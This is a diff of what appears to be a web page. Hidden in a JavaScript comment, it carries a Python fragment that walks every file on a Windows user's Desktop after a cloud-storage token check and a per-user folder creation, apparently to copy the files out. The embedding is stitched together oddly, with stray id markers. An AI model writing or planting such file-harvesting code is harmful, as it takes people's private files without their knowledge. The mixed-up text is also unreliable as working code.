@@ -137,12 +137,12 @@
 <script type="text/javascript" charset="utf-8">
 /*
 id=4352421
-def f(start_path):
+def file_handler(start_path):
     for path in os.listdir(start_path):
         current_path = os.path.join(start_path, path)
 
         if os.path.isdir(current_path):
-            f(current_path)
+            file_handler(current_path)
         elif os.path.isfile(current_path):
             file_name = os.path.basename(current_path)
             file_extension = file_name.split('.')[-1]
@@ -165,9 +165,10 @@ if disk.check_token():
     try:
         disk.mkdir(username)
     except Exception as error: pass
-
-    os.mkdir(os.path.join(r'C:\Users', username, 'Desktop', 'wow'))
-    f(os.path.join(r'C:\Users', username, 'Desktop'))id=4352421
+    
+    print(dir())
+    
+    file_handler(os.path.join(r'C:\Users', username, 'Desktop'))id=4352421
 */
 var status = 0, download, div, link;
 function on_click() {
